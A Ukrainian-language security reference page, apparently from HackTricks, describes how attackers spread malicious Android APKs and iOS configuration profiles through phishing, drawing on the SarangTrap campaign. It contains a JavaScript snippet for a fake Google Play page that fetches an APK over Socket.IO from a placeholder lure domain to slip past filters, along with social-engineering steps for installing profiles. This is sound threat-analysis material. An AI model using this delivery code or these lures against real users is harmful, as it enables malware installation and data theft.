# Mobile Phishing і поширення шкідливих застосунків (Android та iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> На цій сторінці описано методи, які зловмисники використовують для поширення **шкідливих Android APK** і **профілів конфігурації iOS** за допомогою phishing (SEO, соціальна інженерія, підроблені магазини, dating-застосунки тощо).
> Матеріал адаптовано з кампанії SarangTrap, викритої Zimperium zLabs (2025), та інших відкритих досліджень.<sup>[[1]](#references)</sup>

## Схема атаки

1. **SEO/phishing-інфраструктура**
   * Реєстрація десятків схожих доменів (dating, хмарний обмін файлами, автосервіс тощо).  
     – Використання ключових слів місцевою мовою та emoji в елементі `<title>`, щоб покращити позицію в Google.  
     – Розміщення інструкцій зі встановлення як для Android (`.apk`), так і для iOS на одній цільовій сторінці.
2. **Завантаження першого етапу**
   * Android: пряме посилання на *непідписаний* APK або APK із «стороннього магазину».  
   * iOS: посилання `itms-services://` або звичайне HTTPS-посилання на шкідливий профіль **mobileconfig** (див. нижче).
3. **Поведінка Android після встановлення**
   * Виконання, контрольоване через C2, зловживання дозволами, обходи dropper, збір даних у фоновому режимі та інші способи поведінки шкідливого ПЗ після встановлення розглянуто на окремій сторінці Android Malware Post-Exploitation нижче.
4. **Метод доставки для iOS**
   * Один **профіль мобільної конфігурації** може запитувати `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` тощо, щоб перевести пристрій під нагляд, подібний до «MDM».  
   * Інструкції із соціальної інженерії:
     1. Відкрити Settings ➜ *Profile downloaded*.
     2. Тричі натиснути *Install* (скриншоти на phishing-сторінці).  
     3. Довіритися непідписаному профілю ➜ зловмисник отримує права *Contacts* і *Photo* без перевірки App Store.
5. **Корисне навантаження iOS Web Clip (значок phishing-застосунку)**
   * Корисні навантаження `com.apple.webClip.managed` можуть **закріпити phishing URL на головному екрані** під брендованими значком і міткою.
   * Web Clips можуть працювати **на весь екран** (приховуючи інтерфейс браузера) і бути позначені як **незнімні**, змушуючи жертву видалити профіль, щоб прибрати значок.<sup>[[3]](#references)</sup>
6. **Мережевий рівень**
   * Звичайний HTTP, часто на порту 80 із HOST-заголовком на кшталт `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (без TLS → легко виявити).

## Android Malware Post-Exploitation

Про тактики Android-шкідливого ПЗ після встановлення, як-от C2, зловживання Accessibility, overlays, автоматизацію ATS, поетапне завантаження DEX, premium SMS і закріплення в системі, див.:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## APK-smuggling через Socket.IO/WebSocket і підроблені сторінки Google Play

Зловмисники дедалі частіше замінюють статичні посилання на APK каналом Socket.IO/WebSocket, вбудованим у приманки, що імітують Google Play. Це приховує URL корисного навантаження, обходить фільтри URL/розширень і зберігає реалістичний процес встановлення.<sup>[[2]](#references)[[4]](#references)</sup>

Типовий потік клієнта, виявлений у реальних атаках:

<details>
<summary>Підроблений завантажувач Play через Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Чому це обходить прості засоби контролю:
- Статичну URL-адресу APK не розкрито; payload відновлюється в пам’яті з кадрів WebSocket.
- Фільтри URL/MIME/розширень, які блокують прямі відповіді .apk, можуть не виявити двійкові дані, тунельовані через WebSockets/Socket.IO.
- Crawler-и та URL-пісочниці, які не виконують WebSockets, не отримають payload.

Див. також WebSocket tradecraft та інструменти:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Темний бік романтики: кампанія вимагання SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Налаштування payload Web Clips для пристроїв Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Банківський троян, націлений на користувачів Android з Індонезії та В’єтнаму](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
